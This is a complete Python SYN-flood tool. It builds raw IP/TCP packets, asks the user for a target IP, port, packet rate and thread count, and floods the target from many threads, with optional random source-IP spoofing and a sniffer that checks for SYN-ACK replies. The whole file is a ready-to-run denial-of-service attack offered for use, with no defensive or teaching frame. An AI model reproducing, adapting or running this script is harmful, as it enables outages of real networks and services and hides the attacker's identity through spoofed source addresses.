#!/usr/bin/env python3

import socket
import struct
import random
import threading
import time
import ipaddress
import sys

# ---- Packet-building utilities ----

def checksum(data: bytes) -> int:
    """Compute the Internet Checksum of the supplied data."""
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = data[i] << 8 | data[i+1]
        s += w
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF

class IPPacket:
    def __init__(self, src_ip: str, dst_ip: str):
        self.version = 4
        self.ihl     = 5
        self.tos     = 0
        self.tot_len = 20 + 20
        self.id      = random.randint(0, 0xFFFF)
        self.frag_off= 0
        self.ttl     = 64
        self.proto   = socket.IPPROTO_TCP
        self.src     = src_ip
        self.dst     = dst_ip

    def build(self) -> bytes:
        ver_ihl = (self.version << 4) + self.ihl
        hdr = struct.pack(
            '!BBHHHBBH4s4s',
            ver_ihl,
            self.tos,
            self.tot_len,
            self.id,
            self.frag_off,
            self.ttl,
            self.proto,
            0,
            socket.inet_aton(self.src),
            socket.inet_aton(self.dst),
        )
        chksum = checksum(hdr)
        return struct.pack(
            '!BBHHHBBH4s4s',
            ver_ihl,
            self.tos,
            self.tot_len,
            self.id,
            self.frag_off,
            self.ttl,
            self.proto,
            chksum,
            socket.inet_aton(self.src),
            socket.inet_aton(self.dst),
        )

class TCPPacket:
    FLAG_MAP = {'F':1,'S':2,'R':4,'P':8,'A':16,'U':32}

    def __init__(self, src_ip: str, dst_ip: str,
                 src_port: int, dst_port: int,
                 seq: int, flags: str = "S",
                 window: int = 5840):
        self.src_ip   = src_ip
        self.dst_ip   = dst_ip
        self.src_port = src_port
        self.dst_port = dst_port
        self.seq      = seq
        self.ack_seq  = 0
        self.data_off = 5
        self.flags    = flags
        self.window   = window
        self.urg_ptr  = 0

    def build(self) -> bytes:
        offset_res = (self.data_off << 4) + 0
        hdr = struct.pack(
            '!HHLLBBHHH',
            self.src_port,
            self.dst_port,
            self.seq,
            self.ack_seq,
            offset_res,
            self._flags_to_int(),
            self.window,
            0,
            self.urg_ptr
        )
        psh = struct.pack(
            '!4s4sBBH',
            socket.inet_aton(self.src_ip),
            socket.inet_aton(self.dst_ip),
            0,
            socket.IPPROTO_TCP,
            len(hdr)
        ) + hdr
        chksum = checksum(psh)
        return struct.pack(
            '!HHLLBBHHH',
            self.src_port,
            self.dst_port,
            self.seq,
            self.ack_seq,
            offset_res,
            self._flags_to_int(),
            self.window,
            chksum,
            self.urg_ptr
        )

    def _flags_to_int(self) -> int:
        bits = 0
        for ch in self.flags:
            bits |= self.FLAG_MAP.get(ch.upper(), 0)
        return bits

# ---- Flood logic ----

def random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def get_local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()

def send_syn(src_ip: str, dst_ip: str, dst_port: int):
    src_port = random.randint(1024, 65535)
    seq      = random.randint(0, 0xFFFFFFFF)
    ip_hdr   = IPPacket(src_ip, dst_ip).build()
    tcp_hdr  = TCPPacket(src_ip, dst_ip, src_port, dst_port, seq, flags="S").build()
    raw_sock.sendto(ip_hdr + tcp_hdr, (dst_ip, 0))

def sniff_responses(target_ip: str, local_ip: str):
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sniffer.settimeout(1.0)
    while True:
        try:
            packet, _ = sniffer.recvfrom(65535)
        except socket.timeout:
            continue
        iph = struct.unpack('!BBHHHBBH4s4s', packet[:20])
        ihl = (iph[0] & 0x0F) * 4
        src = socket.inet_ntoa(iph[8])
        dst = socket.inet_ntoa(iph[9])
        if src == target_ip and dst == local_ip:
            tcph = struct.unpack('!HHLLBBHHH', packet[ihl:ihl+20])
            flags = tcph[5]
            if flags & 0x12 == 0x12:
                print(f"[+] SYN-ACK from {src}:{tcph[0]} (connectivity OK)")

def flood_worker(thread_id: int, pps_thread: int, target_ip: str, target_port: int, spoof: bool, local_ip: str):
    print(f"[*] Thread {thread_id} started (@ {pps_thread}pps, spoof={spoof})")
    try:
        while True:
            start = time.time()
            for _ in range(pps_thread):
                src = random_ip() if spoof else local_ip
                send_syn(src, target_ip, target_port)
            elapsed = time.time() - start
            if elapsed < 1:
                time.sleep(1 - elapsed)
    except Exception as e:
        print(f"[!] Thread {thread_id} error: {e}")

if __name__ == "__main__":
    if not hasattr(socket, "IPPROTO_RAW"):
        print("[-] Raw sockets not supported or not root.")
        sys.exit(1)

    target_ip   = input("Target IP           : ").strip()
    try:
        ipaddress.IPv4Address(target_ip)
    except ipaddress.AddressValueError:
        print(f"[-] Invalid IP: {target_ip}")
        sys.exit(1)
    target_port  = int(input("Target Port         : ").strip())
    pps           = int(input("Packets per sec     : ").strip())
    num_threads  = int(input("Number of threads   : ").strip())
    spoof_input  = input("Use IP spoofing? (y/n): ").strip().lower()
    spoof        = spoof_input.startswith('y')
    local_ip     = get_local_ip()
    print(f"[*] Local IP: {local_ip}")

    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Start sniffer thread
    threading.Thread(
        target=sniff_responses,
        args=(target_ip, local_ip),
        daemon=True
    ).start()

    # Test SYN to verify connectivity
    print("[*] Sending test SYN (no spoof)...")
    send_syn(local_ip, target_ip, target_port)
    time.sleep(2)

    print(f"[*] Flooding {target_ip}:{target_port} @ {pps}pps across {num_threads} threads (spoof={spoof})")
    pps_per_thread = max(1, pps // num_threads)

    for i in range(num_threads):
        threading.Thread(
            target=flood_worker,
            args=(i+1, pps_per_thread, target_ip, target_port, spoof, local_ip),
            daemon=True
        ).start()

    # Keep main alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
        sys.exit(0)
